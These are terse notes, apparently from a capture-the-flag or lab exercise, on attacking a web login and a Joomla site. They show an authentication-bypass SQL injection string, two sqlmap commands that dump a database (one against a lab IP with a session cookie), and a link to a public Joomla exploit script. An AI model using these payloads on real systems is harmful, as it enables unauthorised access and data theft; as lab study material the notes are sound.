SELECT * FROM users WHERE username = :username AND password := password 
SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
' or 1=1 -- -

sqlmap -r request.txt --dbms=mysql --dump

# https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py

sqlmap http://10.10.107.81/admin?user=3 --cookie='token=[Enter Cookie]' --technique=U --delay=2 -dump